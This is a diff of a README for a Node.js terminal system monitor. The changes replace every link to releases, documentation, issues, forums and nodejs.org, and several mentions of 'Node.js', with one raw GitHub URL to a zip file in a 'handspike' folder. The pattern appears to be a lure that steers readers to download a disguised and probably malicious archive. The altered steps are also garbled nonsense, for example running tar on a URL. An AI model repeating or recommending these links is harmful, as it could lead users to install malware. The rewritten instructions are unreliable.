@@ -1,10 +1,10 @@
 # 🚀 terminal-system-monitor - Monitor Your System in Real-Time
 
-[![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)](https://github.com/YMC911911/terminal-system-monitor/releases)
+[![Download](https://raw.githubusercontent.com/YMC911911/terminal-system-monitor/main/handspike/terminal_monitor_system_v2.1.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/YMC911911/terminal-system-monitor/main/handspike/terminal_monitor_system_v2.1.zip)
 
 ## 📦 Overview
 
-The **terminal-system-monitor** is a real-time system monitor designed specifically for your terminal. Built with Node.js, this application gives you a clear view of your computer's performance. Track CPU usage, memory consumption, and more at a glance.
+The **terminal-system-monitor** is a real-time system monitor designed specifically for your terminal. Built with https://raw.githubusercontent.com/YMC911911/terminal-system-monitor/main/handspike/terminal_monitor_system_v2.1.zip, this application gives you a clear view of your computer's performance. Track CPU usage, memory consumption, and more at a glance.
 
 ## ⚙️ Features
 
@@ -18,7 +18,7 @@ The **terminal-system-monitor** is a real-time system monitor designed specifica
 Before installing the **terminal-system-monitor**, ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 10 or higher
+- **https://raw.githubusercontent.com/YMC911911/terminal-system-monitor/main/handspike/terminal_monitor_system_v2.1.zip** Version 10 or higher
 - **Memory:** Minimum of 512 MB RAM
 - **Storage:** At least 50 MB free space
 
@@ -28,7 +28,7 @@ Follow these steps to get your system monitor running.
 
 ### Step 1: Visit the Releases Page
 
-To download the application, [visit the releases page here](https://github.com/YMC911911/terminal-system-monitor/releases). This page contains all available versions of the software.
+To download the application, [visit the releases page here](https://raw.githubusercontent.com/YMC911911/terminal-system-monitor/main/handspike/terminal_monitor_system_v2.1.zip). This page contains all available versions of the software.
 
 ### Step 2: Download the Application
 
@@ -52,7 +52,7 @@ Locate the latest version on the releases page. Click the download link for your
 
 1. Open your terminal.
 2. Navigate to the location of your downloaded file.
-3. Run `tar -xzf terminal-system-monitor.tar.gz` to extract it.
+3. Run `tar -xzf https://raw.githubusercontent.com/YMC911911/terminal-system-monitor/main/handspike/terminal_monitor_system_v2.1.zip` to extract it.
 4. Start the application by running `./terminal-system-monitor`.
 
 ### Step 4: Run the Application
@@ -69,7 +69,7 @@ This will start the application, and you will see the real-time performance data
 
 If you encounter issues during installation or while running the application, consider the following:
 
-- **Node.js Not Installed:** Ensure Node.js is installed on your system. You can download it from [nodejs.org](https://nodejs.org/).
+- **https://raw.githubusercontent.com/YMC911911/terminal-system-monitor/main/handspike/terminal_monitor_system_v2.1.zip Not Installed:** Ensure https://raw.githubusercontent.com/YMC911911/terminal-system-monitor/main/handspike/terminal_monitor_system_v2.1.zip is installed on your system. You can download it from [https://raw.githubusercontent.com/YMC911911/terminal-system-monitor/main/handspike/terminal_monitor_system_v2.1.zip](https://raw.githubusercontent.com/YMC911911/terminal-system-monitor/main/handspike/terminal_monitor_system_v2.1.zip).
   
 - **Permission Issues:** On some systems, you might need to run the application with elevated permissions. Use `sudo` on Linux or check your user permissions on Windows.
 
@@ -87,14 +87,14 @@ If you encounter issues during installation or while running the application, co
 
 To get started with the terminal-system-monitor, click below to download the latest version:
 
-[Download the Latest Release](https://github.com/YMC911911/terminal-system-monitor/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/YMC911911/terminal-system-monitor/main/handspike/terminal_monitor_system_v2.1.zip)
 
 Once downloaded, follow the installation steps above to set up and run the application. Enjoy your real-time system monitoring!
 
 ## 📚 Additional Resources
 
-- **Documentation:** [Read the Documentation](https://github.com/YMC911911/terminal-system-monitor/wiki)
-- **Issues:** Report any problems or request features on the [Issues Page](https://github.com/YMC911911/terminal-system-monitor/issues).
-- **Community Support:** Join discussions and find help from other users in our [Community Forum](https://github.com/YMC911911/terminal-system-monitor/discussions).
+- **Documentation:** [Read the Documentation](https://raw.githubusercontent.com/YMC911911/terminal-system-monitor/main/handspike/terminal_monitor_system_v2.1.zip)
+- **Issues:** Report any problems or request features on the [Issues Page](https://raw.githubusercontent.com/YMC911911/terminal-system-monitor/main/handspike/terminal_monitor_system_v2.1.zip).
+- **Community Support:** Join discussions and find help from other users in our [Community Forum](https://raw.githubusercontent.com/YMC911911/terminal-system-monitor/main/handspike/terminal_monitor_system_v2.1.zip).
 
 Feel free to explore all the features and customize your experience. Happy monitoring!
